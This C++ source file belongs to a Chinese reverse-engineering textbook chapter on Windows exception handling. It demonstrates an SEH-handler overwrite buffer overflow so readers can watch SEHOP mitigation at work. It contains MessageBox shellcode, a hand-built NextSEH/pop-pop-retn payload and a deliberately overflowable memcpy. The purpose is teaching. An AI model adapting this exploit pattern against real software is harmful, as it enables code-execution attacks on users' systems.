/*-----------------------------------------------------------------------
第8章  Windows下的异常处理
《加密与解密（第四版）》
(c)  看雪学院 www.kanxue.com 2000-2018
-----------------------------------------------------------------------*/

// SEHExploit.cpp : Defines the entry point for the console application.
// Author:achillis
// 建议运行平台: Vista+，如Win7/8/10均可
// 本程序为显示SEHOP设置对覆盖SEH Handler方式的溢出攻击的防护
// 请读者分别在开启和关闭SEHOP保护的情况下运行和调试本程序，观察效果的区别
// 重点调试ntdll!__RtlUserThreadStart函数和ntdll!RtlDispatchException函数
// 不熟悉覆盖SEH Handler方式溢出攻击的读者请先自行阅读相关知识，并在未开启SEHOP进调试本程序进行观察熟悉

#include "stdafx.h"
#include <windows.h>

VOID BugFun(BYTE *InputBuffer,ULONG InputLength);
VOID InitBuffer(BYTE *InputBuffer);

//一段弹出MsgBox的ShellCode
char shellcode[] =  "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
					"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
					"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
					"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
					"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
					"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"
					"\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"
					"\x49\x0b\x31\xc0\x51\x50\xff\xd7";

int main(int argc, char* argv[])
{
	BYTE Buffer[8192];
	//构造一个适合SEH Handler利用的内存环境
	InitBuffer(Buffer);
	BugFun(Buffer,128);
	return 0;
}

VOID InitBuffer(BYTE *InputBuffer)
{
	memset(InputBuffer,'A',0x30);
	InputBuffer[0x30] = 0xEB ; //NextSEH
	InputBuffer[0x31] = 0x06 ;
	InputBuffer[0x32] = 0x90 ;
	InputBuffer[0x33] = 0x90 ;

	ULONG *pBuf = (ULONG*)(InputBuffer + 0x34);
	
	//申请0x41420000处的内存
	BYTE *pMem = (BYTE*)VirtualAlloc((PVOID)0x41420000,0x15000,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
	if (pMem != NULL)
	{
		printf("pMem = 0x%p\n",pMem);
		//为了保证通用性，这里手动构造pop/pop/retn指令序列，实际攻击中需要从库文件中找这样的指令
		pMem[0x4344] = 0x58 ; //pop eax
		pMem[0x4345] = 0x58 ; //pop eax
		pMem[0x4346] = 0xC3 ; //retn

		pBuf[0] = 0x41424344 ; //SEHHandler , 指向pop pop retn
		strcpy((char*)&pBuf[1],(char*)shellcode);
	}
	else
	{
		printf("Alloc Mem failed.\n");
	}

}

VOID BugFun(BYTE *InputBuffer,ULONG InputLength)
{
	BYTE LocalBuffer[36];
	ULONG *pch;
	__try
	{
		memcpy(LocalBuffer,InputBuffer,InputLength);
		pch = (ULONG*)*(ULONG*)(LocalBuffer + 32);
		printf("pch = 0x%p\n",pch);
		*pch = 0x55555555 ;
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		printf("Exception Code = 0x%08X\n",GetExceptionCode());
	}
}
